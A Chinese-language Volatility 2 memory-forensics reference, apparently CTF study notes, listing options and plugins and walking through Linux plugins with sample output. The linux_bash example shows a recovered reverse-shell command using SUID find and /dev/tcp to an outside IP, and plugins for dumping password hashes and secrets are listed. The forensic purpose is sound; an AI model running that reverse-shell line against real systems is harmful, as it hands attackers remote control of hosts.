# volatility 2



## 基础选项

```
  -h, --help            显示所有可用选项及其默认值。
                        默认值可在配置文件中设置
                        (/etc/volatilityrc)
  --conf-file=/root/.volatilityrc
                        用户配置文件
  -d, --debug           调试模式
  --plugins=PLUGINS     附加插件目录（用冒号分隔）
  --info                打印所有已注册对象的信息
  --cache-directory=/root/.cache/volatility
                        缓存文件存储目录
  --cache               启用缓存
  --tz=TZ               设置时区（使用pytz或tzset显示时间戳）
  -f FILENAME, --filename=FILENAME
                        要打开的镜像文件名
  --profile=WinXPSP2x86
                        要加载的配置文件名称（使用 --info 查看支持列表）
  -l LOCATION, --location=LOCATION
                        加载地址空间的URN位置
  -w, --write           启用写支持
  --dtb=DTB             DTB地址
  --shift=SHIFT         Mac KASLR 偏移地址
  --output=text         输出格式（支持模块特定格式，详见模块输出选项）
  --output-file=OUTPUT_FILE
                        输出到指定文件
  -v, --verbose         详细输出
  --physical_shift=PHYSICAL_SHIFT
                        Linux 内核物理偏移地址
  --virtual_shift=VIRTUAL_SHIFT
                        Linux 内核虚拟偏移地址
  -g KDBG, --kdbg=KDBG  指定KDBG虚拟地址（注意：对于64位Windows 8及以上系统，这是KdCopyDataBlock的地址）
  --force               强制使用可疑的配置文件
  -k KPCR, --kpcr=KPCR  指定具体的KPCR地址
  --cookie=COOKIE       指定nt!ObHeaderCookie地址（仅适用于Windows 10）
```



## 基础插件

```
地址空间
--------------
AMD64PagedMemory               - 标准 AMD 64 位地址空间。
ArmAddressSpace                - ARM 处理器专用地址空间
FileAddressSpace               - 直接文件地址空间
HPAKAddressSpace               - 支持 HPAK 格式的地址空间
IA32PagedMemory                - 标准 IA-32 分页地址空间
IA32PagedMemoryPae             - 实现 IA-32 PAE 分页机制的地址空间类
LimeAddressSpace               - Lime 格式专用地址空间
LinuxAMD64PagedMemory          - Linux 特有的 AMD 64 位地址空间
MachOAddressSpace              - 支持 mach-o 文件格式的地址空间（用于 atc-ny 内存读取器）
OSXPmemELF                     - 支持 VirtualBox ELF64 核心转储格式的地址空间
QemuCoreDumpElf                - 支持 Qemu ELF32 和 ELF64 核心转储格式的地址空间
SkipDuplicatesAMD64PagedMemory - Windows 8/10 专用的 AMD 64 位地址空间
VMWareAddressSpace             - 支持 VMware 快照（VMSS）和保存状态文件的地址空间
VMWareMetaAddressSpace         - 支持带 VMSN/VMSS 元数据的 VMEM 格式的地址空间
VirtualBoxCoreDumpElf64        - 支持 VirtualBox ELF64 核心转储格式的地址空间
WindowsAMD64PagedMemory        - Windows 专用的 AMD 64 位地址空间
WindowsCrashDumpSpace32        - 支持 Windows 崩溃转储格式（32 位）
WindowsCrashDumpSpace64        - 支持 Windows 崩溃转储格式（64 位）
WindowsCrashDumpSpace64BitMap  - 支持 Windows 位图崩溃转储格式的地址空间
WindowsHiberFileSpace32        - Windows 休眠文件地址空间（32 位）


模块插件
-------
amcache                    - 打印 AmCache 信息
apihooks                   - 检测进程和内核内存中的 API 钩子
atoms                      - 打印会话和窗口站原子表
atomscan                   - 原子表的池扫描器
auditpol                   - 打印注册表 HKLM\SECURITY\Policy\PolAdtEv 的审计策略
bigpools                   - 使用 BigPagePoolScanner 转储大页内存池
bioskbd                    - 从实模式内存读取键盘缓冲区
cachedump                  - 转储内存中的缓存域哈希
callbacks                  - 打印全系统范围的通知例程
clipboard                  - 提取 Windows 剪贴板内容
cmdline                    - 显示进程命令行参数
cmdscan                    - 通过扫描 _COMMAND_HISTORY 提取命令历史
connections                - 打印已开启连接列表（仅限 Windows XP/2003）
connscan                   - TCP 连接的池扫描器
consoles                   - 通过扫描 _CONSOLE_INFORMATION 提取控制台信息
crashinfo                  - 转储崩溃转储信息
deskscan                   - tagDESKTOP（桌面）池扫描器
devicetree                 - 显示设备树
dlldump                    - 从进程地址空间转储 DLL
dlllist                    - 打印各进程加载的 DLL 列表
driverirp                  - 驱动程序 IRP 钩子检测
drivermodule               - 将驱动对象关联到内核模块
driverscan                 - 驱动对象的池扫描器
dumpcerts                  - 转储 RSA 公私钥（SSL）
dumpfiles                  - 提取内存映射和缓存文件
dumpregistry               - 将注册表文件转储到磁盘
editbox                    - 显示编辑控件信息（列表框功能实验性）
envars                     - 显示进程环境变量
eventhooks                 - 打印 Windows 事件钩子详情
evtlogs                    - 提取 Windows 事件日志（仅限 XP/2003）
filescan                   - 文件对象的池扫描器
gahti                      - 转储 USER 句柄类型信息
gditimers                  - 打印已安装的 GDI 计时器和回调
gdt                        - 显示全局描述符表（GDT）
getservicesids             - 从注册表获取服务名并返回计算的 SID
getsids                    - 打印进程所有者 SID
handles                    - 打印各进程的打开句柄列表
hashdump                   - 从内存转储密码哈希（LM/NTLM）
hibinfo                    - 转储休眠文件信息
hivedump                   - 打印注册表配置单元内容
hivelist                   - 打印注册表配置单元列表
hivescan                   - 注册表配置单元的池扫描器
hpakextract                - 从 HPAK 文件提取物理内存
hpakinfo                   - 显示 HPAK 文件信息
idt                        - 显示中断描述符表（IDT）
iehistory                  - 重建 IE 缓存/历史记录
imagecopy                  - 将物理地址空间复制为原始镜像文件
imageinfo                  - 识别镜像信息
impscan                    - 扫描导入函数调用
joblinks                   - 打印进程作业链接信息
kdbgscan                   - 搜索并转储潜在 KDBG 值
kpcrscan                   - 搜索并转储潜在 KPCR 值
ldrmodules                 - 检测未链接的 DLL
limeinfo                   - 转储 Lime 文件格式信息
linux_apihooks             - 检查用户态 API 钩子
linux_arp                  - 打印 ARP 表
linux_aslr_shift           - 自动检测 Linux ASLR 偏移值
linux_banner               - 打印 Linux 系统标识信息
linux_bash                 - 从 bash 进程内存恢复历史命令
linux_bash_env             - 恢复进程动态环境变量
linux_bash_hash            - 从 bash 进程内存恢复哈希表
linux_check_afinfo         - 验证网络协议操作函数指针
linux_check_creds          - 检查共享凭证结构的进程
linux_check_evt_arm        - 通过异常向量表检测系统调用表钩子
linux_check_fop            - 检查文件操作结构的后门修改
linux_check_idt            - 检查 IDT 篡改情况
linux_check_inline_kernel  - 检测内核内联钩子
linux_check_modules        - 比较模块列表与 sysfs 信息
linux_check_syscall        - 检查系统调用表篡改
linux_check_syscall_arm    - 检查 ARM 系统调用表篡改
linux_check_tty            - 检查 TTY 设备钩子
linux_cpuinfo              - 打印各活动处理器信息
linux_dentry_cache         - 从目录项缓存收集文件
linux_dmesg                - 收集 dmesg 缓冲区内容
linux_dump_map             - 将选定内存映射写入磁盘
linux_dynamic_env          - 恢复进程动态环境变量
linux_elfs                 - 在进程映射中查找 ELF 二进制文件
linux_enumerate_files      - 枚举文件系统缓存引用的文件
linux_find_file            - 列出并恢复内存中的文件
linux_getcwd               - 列出各进程当前工作目录
linux_hidden_modules       - 挖掘隐藏的内核模块
linux_ifconfig             - 收集活动网络接口信息
linux_info_regs            - 类似 GDB 的 "info registers" 命令
linux_iomem                - 提供类似 /proc/iomem 的输出
linux_kernel_opened_files  - 列出内核打开的文件
linux_keyboard_notifiers   - 解析键盘通知器调用链
linux_ldrmodules           - 对比进程映射与 libdl 的库列表
linux_library_list         - 列出进程加载的库
linux_librarydump          - 将进程内存中的共享库转储到磁盘
linux_list_raw             - 列出使用混杂模式套接字的应用程序
linux_lsmod                - 收集已加载内核模块
linux_lsof                 - 列出文件描述符及其路径
linux_malfind              - 查找可疑的进程内存映射
linux_memmap               - 转储 Linux 任务的内存映射
linux_moddump              - 提取已加载内核模块
linux_mount                - 收集挂载的文件系统/设备
linux_mount_cache          - 从 kmem_cache 收集挂载信息
linux_netfilter            - 列出 Netfilter 钩子
linux_netscan              - 扫描网络连接结构
linux_netstat              - 列出打开的网络套接字
linux_pidhashtable         - 通过 PID 哈希表枚举进程
linux_pkt_queues           - 将进程数据包队列写入磁盘
linux_plthook              - 扫描 ELF 二进制 PLT 的非必要映像钩子
linux_proc_maps            - 收集进程内存映射信息
linux_proc_maps_rb         - 通过红黑树收集进程内存映射
linux_procdump             - 将进程可执行镜像转储到磁盘
linux_process_hollow       - 检测进程挖空迹象
linux_psaux                - 收集带完整命令行参数的进程
linux_psenv                - 收集带静态环境变量的进程
linux_pslist               - 通过 task_struct->task 列表收集活动任务
linux_pslist_cache         - 从 kmem_cache 收集任务
linux_psscan               - 在物理内存中扫描进程
linux_pstree               - 以树状显示进程父子关系
linux_psxview              - 通过多进程列表发现隐藏进程
linux_recover_filesystem   - 从内存恢复完整缓存文件系统
linux_route_cache          - 从内存恢复路由缓存
linux_sk_buff_cache        - 从 sk_buff kmem_cache 恢复网络包
linux_slabinfo             - 模拟运行系统的 /proc/slabinfo 输出
linux_strings              - 物理偏移与虚拟地址匹配（耗时，详细输出）
linux_threads              - 打印进程的线程信息
linux_tmpfs                - 从内存恢复 tmpfs 文件系统
linux_truecrypt_passphrase - 恢复 TrueCrypt 缓存的密码短语
linux_vma_cache            - 从 vm_area_struct 缓存收集 VMA
linux_volshell             - 在 Linux 内存镜像中开启交互式 shell
linux_yarascan             - 使用 Yara 签名扫描 Linux 内存镜像
lsadump                    - 从注册表转储（解密）LSA 机密
mac_adium                  - 列出 Adium 聊天信息
mac_apihooks               - 检查进程中的 API 钩子
mac_apihooks_kernel        - 检测系统调用和内核函数钩子
mac_arp                    - 打印 ARP 表
mac_bash                   - 从 bash 进程内存恢复历史命令
mac_bash_env               - 恢复 bash 环境变量
mac_bash_hash              - 从 bash 进程内存恢复哈希表
mac_calendar               - 从日历应用获取日程事件
mac_check_fop              - 验证文件操作指针
mac_check_mig_table        - 列出内核 MIG 表条目
mac_check_syscall_shadow   - 检测影子系统调用表
mac_check_syscalls         - 检查系统调用表条目钩子
mac_check_sysctl           - 检查未知的 sysctl 处理函数
mac_check_trap_table       - 检查 mach 陷阱表条目钩子
mac_compressed_swap        - 打印 macOS 内存压缩统计并转储压缩页
mac_contacts               - 从通讯录应用获取联系人
mac_dead_procs             - 打印已终止/释放的进程
mac_dead_sockets           - 打印已终止/释放的网络套接字
mac_dead_vnodes            - 列出已释放的 vnode 结构
mac_devfs                  - 列出文件缓存中的文件
mac_dmesg                  - 打印内核调试缓冲区内容
mac_dump_file              - 转储指定文件
mac_dump_maps              - 转储进程的内存映射
mac_dyld_maps              - 通过 dyld 数据结构获取进程内存映射
mac_find_aslr_shift        - 查找 10.8+ 系统的 ASLR 偏移值
mac_get_profile            - 自动检测 macOS 系统配置
mac_ifconfig               - 列出所有设备的网络接口信息
mac_interest_handlers      - 列出 IOKit 兴趣处理函数
mac_ip_filters             - 报告任何挂钩的 IP 过滤器
mac_kernel_classes         - 列出内核加载的 C++ 类
mac_kevents                - 显示进程父子关系
mac_keychaindump           - 恢复可能的钥匙串密钥（需配合 chainbreaker 使用）
mac_ldrmodules             - 对比进程映射与 libdl 的库列表
mac_librarydump            - 转储进程可执行文件
mac_list_files             - 列出文件缓存中的文件
mac_list_kauth_listeners   - 列出 Kauth 范围监听器
mac_list_kauth_scopes      - 列出 Kauth 范围及其状态
mac_list_raw               - 列出使用混杂模式套接字的应用程序
mac_list_sessions          - 枚举会话信息
mac_list_zones             - 打印活动内存分区
mac_lsmod                  - 列出已加载内核模块
mac_lsmod_iokit            - 通过 IOKit 列出内核模块
mac_lsmod_kext_map         - 列出已加载内核模块
mac_lsof                   - 列出各进程打开的文件
mac_machine_info           - 打印硬件信息
mac_malfind                - 查找可疑的进程内存映射
mac_memdump                - 将可寻址内存页转储到文件
mac_moddump                - 将指定内核扩展写入磁盘
mac_mount                  - 打印已挂载设备信息
mac_netstat                - 列出活跃的网络连接
mac_network_conns          - 列出内核网络结构建立的连接
mac_notesapp               - 查找备忘录应用内容
mac_notifiers              - 检测植入 I/O Kit 的 rootkit（如 LogKext）
mac_orphan_threads         - 列出未关联已知模块/进程的线程
mac_pgrp_hash_table        - 遍历进程组哈希表
mac_pid_hash_table         - 遍历 PID 哈希表
mac_print_boot_cmdline     - 打印内核启动参数
mac_proc_maps              - 获取进程内存映射
mac_procdump               - 转储进程可执行文件
mac_psaux                  - 打印带用户态参数（**argv）的进程
mac_psenv                  - 打印带用户态环境变量（**envp）的进程
mac_pslist                 - 列出运行中的进程
mac_pstree                 - 显示进程父子关系
mac_psxview                - 通过多进程列表发现隐藏进程
mac_recover_filesystem     - 恢复缓存文件系统
mac_route                  - 打印路由表
mac_socket_filters         - 报告套接字过滤器
mac_strings                - 物理偏移与虚拟地址匹配（耗时，详细输出）
mac_tasks                  - 列出活动任务
mac_threads                - 列出进程线程
mac_threads_simple         - 列出线程及其启动时间和优先级
mac_timers                 - 报告内核驱动设置的计时器
mac_trustedbsd             - 列出恶意 TrustedBSD 策略
mac_version                - 打印 macOS 版本
mac_vfsevents              - 列出过滤文件系统事件的进程
mac_volshell               - 在内存镜像中开启交互式 shell
mac_yarascan               - 使用 Yara 签名扫描内存
machoinfo                  - 转储 Mach-O 文件格式信息
malfind                    - 查找隐藏和注入的代码
mbrparser                  - 扫描并解析潜在的主引导记录（MBR）
memdump                    - 转储进程可寻址内存
memmap                     - 打印内存映射
messagehooks               - 列出桌面和线程窗口消息钩子
mftparser                  - 扫描并解析潜在的 MFT 条目
moddump                    - 将内核驱动转储为可执行样本
modscan                    - 内核模块池扫描器
modules                    - 列出已加载的内核模块
multiscan                  - 多重对象扫描器
mutantscan                 - 互斥体对象的池扫描器
netscan                    - 扫描 Vista 及以上系统的网络连接和套接字
notepad                    - 列出记事本当前显示文本
objtypescan                - 扫描 Windows 对象类型对象
patcher                    - 基于页面扫描修补内存
poolpeek                   - 可配置的池扫描器插件
pooltracker                - 显示内存池标签使用摘要
printkey                   - 打印注册表键及其子键和值
privs                      - 显示进程权限
procdump                   - 将进程转储为可执行样本
pslist                     - 通过 EPROCESS 列表列出所有运行中的进程
psscan                     - 进程对象的池扫描器
pstree                     - 以树状列出进程
psxview                    - 通过多进程列表发现隐藏进程
qemuinfo                   - 转储 Qemu 信息
raw2dmp                    - 将物理内存样本转换为 WinDbg 崩溃转储
screenshot                 - 基于 GDI 窗口保存伪屏幕截图
servicediff                - 列出 Windows 服务（类似 Plugx）
sessions                   - 列出用户登录会话（_MM_SESSION_SPACE）详细信息
shellbags                  - 打印 ShellBags 信息
shimcache                  - 解析应用兼容性 Shim 缓存注册表项
shutdowntime               - 打印注册表中的系统关机时间
sockets                    - 列示打开的套接字
sockscan                   - TCP 套接字对象的池扫描器
ssdt                       - 显示 SSDT（系统服务描述符表）条目
strings                    - 物理偏移与虚拟地址匹配（耗时，详细输出）
svcscan                    - 扫描 Windows 服务
symlinkscan                - 符号链接对象的池扫描器
thrdscan                   - 线程对象的池扫描器
threads                    - 分析 _ETHREAD 和 _KTHREAD 结构
timeliner                  - 基于内存中的各类痕迹创建时间线
timers                     - 打印内核计时器及关联模块的 DPC
truecryptmaster            - 恢复 TrueCrypt 7.1a 主密钥
truecryptpassphrase        - TrueCrypt 缓存密码查找器
truecryptsummary           - TrueCrypt 摘要信息
unloadedmodules            - 列出已卸载的模块
userassist                 - 打印用户助手注册表项及信息
userhandles                - 转储 USER 句柄表
vaddump                    - 将 VAD 段转储到文件
vadinfo                    - 转储 VAD 信息
vadtree                    - 以树状显示 VAD 结构
vadwalk                    - 遍历 VAD 树
vboxinfo                   - 转储 VirtualBox 信息
verinfo                    - 打印 PE 镜像的版本信息
vmwareinfo                 - 转储 VMware VMSS/VMSN 信息
volshell                   - 在内存镜像中开启交互式 shell
win10cookie                - 查找 Windows 10 的 ObHeaderCookie 值
windows                    - 打印桌面窗口（详细信息）
wintree                    - 按 Z-Order 打印桌面窗口树
wndscan                    - 窗口站的池扫描器
yarascan                   - 使用 Yara 签名扫描进程或内核内存


扫描器检查
--------------
CheckPoolSize          - 检查内存池块大小
CheckPoolType          - 检查内存池类型
KPCRScannerCheck       - 通过自引用指针查找 KPCR
MultiPrefixFinderCheck - 单页内多字符串前缀搜索（基于偏移定位）
MultiStringFinderCheck - 单页内多字符串搜索
PoolTagCheck           - 内存池标签存在性检测
```



## Linux



### linux_bash

从 bash 进程内存中恢复 bash 历史记录

```
vol2 -f ... --profile=... linux_bash [options]

      -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
      -P, --printunalloc    打印未分配条目（建议重定向到文件）
      -H HISTORY_LIST, --history_list=HISTORY_LIST
                            设置历史列表地址 - 参见Volatility文档
      -A, --scan_all        扫描所有进程（不仅限于名为bash的进程）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_bash
```

```
Volatility Foundation Volatility Framework 2.6.1
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    1831 bash                 2023-09-08 03:14:52 UTC+0000   find / -perm -4000 -exec ls -la {} \; 2>/dev/null 
    1831 bash                 2023-09-08 03:14:52 UTC+0000   0
    1831 bash                 2023-09-08 03:15:05 UTC+0000   sudo su
    1831 bash                 2023-09-08 03:15:29 UTC+0000   find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.29.129/7777 0>&1 \;
    2020 bash                 2023-09-08 03:15:33 UTC+0000   whoami
...
```





### linux_bash_env

```
vol2 -f ... --profile=...  linux_bash_env [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_bash_env
```

```
Volatility Foundation Volatility Framework 2.6.1
Pid      Name                 Vars
-------- -------------------- ----
       1 systemd              
       2 kthreadd             
       3 rcu_gp               
       4 rcu_par_gp           
       6 kworker/0:0H         
       9 mm_percpu_wq         
      10 ksoftirqd/0          
```



### linux_bash_hash

```
vol2 -f ... --profile=...  linux_bash_hash [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_bash_hash
```

```
Volatility Foundation Volatility Framework 2.6.1
Pid      Name                 Hits   Command                   Full Path
-------- -------------------- ------ ------------------------- ---------
    1831 bash                      1 sudo                      /usr/bin/sudo
    1831 bash                      2 find                      /usr/bin/find
    2020 bash                      2 cat                       /bin/cat
    2020 bash                      1 cp                        /bin/cp
    2020 bash                      1 whoami                    /usr/bin/whoami
    2093 bash                      1 nano                      /bin/nano
    2093 bash                      1 vim                       /usr/bin/vim
    2093 bash                      3 ls                        /bin/ls
    2093 bash                      1 mesg                      /usr/bin/mesg
    2196 bash                      1 unzip                     /usr/bin/unzip
    2196 bash                      2 ls                        /bin/ls
    2196 bash                      1 mesg                      /usr/bin/mesg
```



### linux_pslist

```
vol2 -f ... --profile=... linux_pslist [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_pslist
```

![image-20250311084828875](./images/volatility%202.assets/image-20250311084828875.png)



### linux_psscan

在物理内存中扫描进程

```
vol2 -f ... --profile=... linux_psscan
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_psscan
```

![image-20250311093850375](./images/volatility%202.assets/image-20250311093850375.png)



### linux_pidhashtable

通过 PID 哈希表枚举进程

```
vol2 -f ... --profile=... linux_pidhashtable [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_pidhashtable
```

![image-20250311094342879](./images/volatility%202.assets/image-20250311094342879.png)



### linux_pstree

```
vol2 -f ... --profile=... linux_pstree [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



**示例**

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_pstree -p 1831
```

```
Volatility Foundation Volatility Framework 2.6.1
Name                 Pid             Uid            
bash                 1831            1000           
.find                2019            1000           
..bash               2020            1000           
```

UID（用户标识符）是 Linux 系统中用于唯一标识用户的数字。每个进程在运行时都会关联一个 UID，表示其所属用户（例如 `root` 的 UID 是 `0`，普通用户可能是 `1000` 等）。

Volatility 的 `linux_pstree` 插件可能默认在**进程继承父进程 UID 时省略显示**，仅在 UID 发生变化时标注。

- `sshd 728`（父进程，UID 默认是 `0`，即 `root`）未显示 UID。
- 子进程 `sshd 1830` 切换到了普通用户（UID `1000`），因此显式标注。





**做题小技巧**

首先使用 linux_pstree 不指定 pid，显示完整的进程数

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_pstree
```

寻找 sshd 的主守护进程（ **.sshd PID 728**）

```
.sshd                728                            
..sshd               1761                           
...sshd              1830            1000           
....bash             1831            1000           
.....find            2019            1000           
......bash           2020            1000           
..sshd               2034                           
...bash              2093                           
....powershell       2132                           
.....gpg             2368                           
....nano             2148                           
..sshd               2149                           
...bash              2196                           
....unzip            2221                           
..sshd               2222                           
...bash              2288                           
....lmg              2333                           
.....avml-x86_64     2364                           
..sshd               2224                           
...sftp-server       2331                           
```



**主守护进程**（PID 728）

- 这是 SSH 服务的**主进程**，通常以 `root` 权限运行（UID 未显示，默认为 `0`）。
- 负责监听 SSH 端口（默认 22），接受新连接请求。
- 不直接处理用户认证或会话，仅用于派生子进程。

**预认证子进程（PID 1761）**

- 主进程（728）在接受新连接后，会 `fork` 出该子进程（1761）。
- 负责处理**初始连接协商**和**密钥交换**（如协议版本、加密算法协商）。
- 仍然以 `root` 权限运行（UID 未显示），但尚未关联具体用户。

**用户会话进程（PID 1830）**

- 如果用户**以普通用户登录**，则需要启动该子进程。
- 此进程切换至普通用户权限（UID `1000`）
- 此子进程负责启动用户的登录会话（如 `bash` 或其他 shell）



如果用于以 root 用户登录，则由**预认证子进程**直接启动 bash 或其他 shell。

以普通用户登录

```
.sshd                728                            
..sshd               1761                           
...sshd              1830            1000           
....bash             1831            1000           
```

以 root 用户登录

```
.sshd                728                            
..sshd               2034                           
...bash              2093                           
```



通过列出**主守护进程**的进程数，就可以知道当前存在多少个 ssh 连接，以及每个连接登录时使用的 UID。

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_pstree -p 728
```

```
Volatility Foundation Volatility Framework 2.6.1
Name                 Pid             Uid            
sshd                 728                            
.sshd                1761                           
..sshd               1830            1000           
...bash              1831            1000           
....find             2019            1000           
.....bash            2020            1000           
.sshd                2034                           
..bash               2093                           
...powershell        2132                           
....gpg              2368                           
...nano              2148                           
.sshd                2149                           
..bash               2196                           
...unzip             2221                           
.sshd                2222                           
..bash               2288                           
...lmg               2333                           
....avml-x86_64      2364                           
.sshd                2224                           
..sftp-server        2331                           
```



### linux_psaux

收集带完整命令行参数的进程

```
vol2 -f ... --profile=... linux_pslist [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_psaux
```

```
Volatility Foundation Volatility Framework 2.6.1
Pid    Uid    Gid    Arguments                                                       
1      0      0      /sbin/init splash                                               
2      0      0      [kthreadd]                                                      
...
606    0      0      /usr/sbin/cron -f                                               
610    0      0      /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
611    102    106    /usr/sbin/rsyslogd -n                                           
```



### linux_psenv

收集带静态环境变量的进程

```
vol2 -f ... --profile=... linux_psenv
```



示例

```
Name   Pid    Environment 
systemd           1      HOME=/ init=/sbin/init NETWORK_SKIP_ENSLAVED= recovery= TERM=linux drop_caps= BOOT_IMAGE=/boot/vmlinuz-5.4.0-84-generic PATH=/sbin:/usr/sbin:/bin:/usr/bin PWD=/ rootmnt=/root
sshd              728    LANG=en_US.UTF-8 LC_ADDRESS=zh_CN.UTF-8 LC_IDENTIFICATION=zh_CN.UTF-8 LC_MEASUREMENT=zh_CN.UTF-8 LC_MONETARY=zh_CN.UTF-8 LC_NAME=zh_CN.UTF-8 LC_NUMERIC=zh_CN.UTF-8 LC_PAPER=zh_CN.UTF-8 LC_TELEPHONE=zh_CN.UTF-8 LC_TIME=zh_CN.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify INVOCATION_ID=ed3d27f1ef1c454e81c523b96d4e1403 JOURNAL_STREAM=9:33456 SSHD_OPTS=
find              2019   LC_MEASUREMENT=zh_CN.UTF-8 SSH_CONNECTION=192.168.29.1 57332 192.168.29.150 22 LESSCLOSE=/usr/bin/lesspipe %s %s LC_PAPER=zh_CN.UTF-8 LC_MONETARY=zh_CN.UTF-8 LANG=en_US.UTF-8 LC_NAME=zh_CN.UTF-8 XDG_SESSION_ID=4 USER=hil PWD=/home/hil HOME=/home/hil SSH_CLIENT=192.168.29.1 57332 22 XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop LC_ADDRESS=zh_CN.UTF-8 LC_NUMERIC=zh_CN.UTF-8 SSH_TTY=/dev/pts/1 MAIL=/var/mail/hil TERM=xterm-256color SHELL=/bin/bash SHLVL=1 LC_TELEPHONE=zh_CN.UTF-8 LOGNAME=hil XDG_RUNTIME_DIR=/run/user/1000 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin LC_IDENTIFICATION=zh_CN.UTF-8 LESSOPEN=| /usr/bin/lesspipe %s LC_TIME=zh_CN.UTF-8 _=/usr/bin/find

```



### linux_proc_maps(_rb)

**linux_proc_maps**：收集进程内存映射信息

**linux_proc_maps_rb**：通过红黑树收集进程内存映射

```
vol2 -f ... --profile=... linux_proc_maps(_rb) [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



| 插件                   | 依赖的内核数据结构             | 适用内核版本          |
| :--------------------- | :----------------------------- | :-------------------- |
| **linux_proc_maps**    | 基于 **vm_area_struct** 链表   | 旧内核（如 4.x 之前） |
| **linux_proc_maps_rb** | 基于 **vm_area_struct** 红黑树 | 新内核（4.x 及之后）  |



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_proc_maps_rb
```

![image-20250311100207529](./images/volatility%202.assets/image-20250311100207529.png)



### linux_procdump

将进程可执行镜像转储到磁盘

```
vol2 -f ... --profile=... linux_procdump -p [pid] -D [directory]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
  						默认导出所有进程可执行镜像转储到磁盘
  -D DUMP_DIR, --dump-dir=DUMP_DIR
                        输出目录
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_procdump -p 728 -D out
```

```
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff90ee345ddd00 sshd                 728             0x000055664f62b000 out/sshd.728.0x55664f62b000
```

```
file sshd.728.0x55664f62b000

sshd.728.0x55664f62b000: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped
```



### linux_dump_map

将选定内存映射写入磁盘

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_dump_map

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
  -s VMA, --vma=VMA     按VMA起始地址过滤
  -D DUMP_DIR, --dump-dir=DUMP_DIR
                        输出目录
```



示例

收集 sshd 主进程的 proc 内存映射信息

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_proc_maps_rb -p 728
```

![image-20250311101532388](./images/volatility%202.assets/image-20250311101532388.png)



文件路径 **/lib/x86_64-linux-gnu/libnss_files-2.27.so** 映射的地址为 **0x00007ff815594000 0x00007ff81559f000**，使用 **linux_dump_map** 插件导出

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_dump_map -s 0x00007ff815594000 -D out
```

```
Task       VM Start           VM End                         Length Path
---------- ------------------ ------------------ ------------------ ----
       728 0x00007ff815594000 0x00007ff81559f000             0xb000 out/task.728.0x7ff815594000.vma
```

```
file task.728.0x7ff815594000.vma

task.728.0x7ff815594000.vma: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, missing section headers at 47504
```



Linux进程的每个**虚拟内存区域 (VMA)** 在内核中都以完整的**结构体 (vm_area_struct)** 存储，每个节点都**包含起始地址和结束地址**，所以只需要提供起始地址即可。







### linux_getcwd

列出每个进程的当前工作目录

```
vol2 -f ... --profile=... linux_getcwd [options]

  -p PID, --pid=PID     对指定进程ID进行操作（逗号分隔）
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_getcwd
```

```
Name              Pid      CWD
----------------- -------- ---
systemd                  1 
kthreadd                 2 
rcu_gp                   3 
...
cron                   606 /var/spool/cron
...
gvfsd                 1404 /home/hil
gvfsd-fuse            1409 /home/hil
at-spi-bus-laun       1418 /home/hil
dbus-daemon           1423 /home/hil
```



### linux_arp

打印 ARP 表

```
vol2 -f ... --profile=... linux_arp
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_arp
```

```
Volatility Foundation Volatility Framework 2.6.1
[192.168.29.129                            ] at 00:0c:29:b9:5e:e2    on ens33
[192.168.29.2                              ] at 00:50:56:f9:e4:62    on ens33
[192.168.29.255                            ] at ff:ff:ff:ff:ff:ff    on ens33
[224.0.0.251                               ] at 01:00:5e:00:00:fb    on ens33
[0.0.0.0                                   ] at 00:00:00:00:00:00    on lo
[192.168.29.1                              ] at 00:50:56:c0:00:08    on ens33
[255.255.255.255                           ] at ff:ff:ff:ff:ff:ff    on ens33
[224.0.0.22                                ] at 01:00:5e:00:00:16    on ens33
[ff02::16                                  ] at 33:33:00:00:00:16    on ens33
[ff02::16                                  ] at 00:00:00:00:00:00    on lo
[ff02::fb                                  ] at 33:33:00:00:00:fb    on ens33
[::1                                       ] at 00:00:00:00:00:00    on lo
[ff02::1                                   ] at 33:33:00:00:00:01    on ens33
[ff02::2                                   ] at 33:33:00:00:00:02    on ens33
[ff02::1:ff11:177c                         ] at 33:33:ff:11:17:7c    on ens33
```





### linux_ifconfig

收集活动网络接口信息

```
vol2 -f ... --profile=... linux_ifconfig
```



示例

```
vol2 -f linux --profile=Linuxubuntu18x64 linux_ifconfig
```

```
Interface        IP Address           MAC Address        Promiscous Mode
---------------- -------------------- ------------------ ---------------
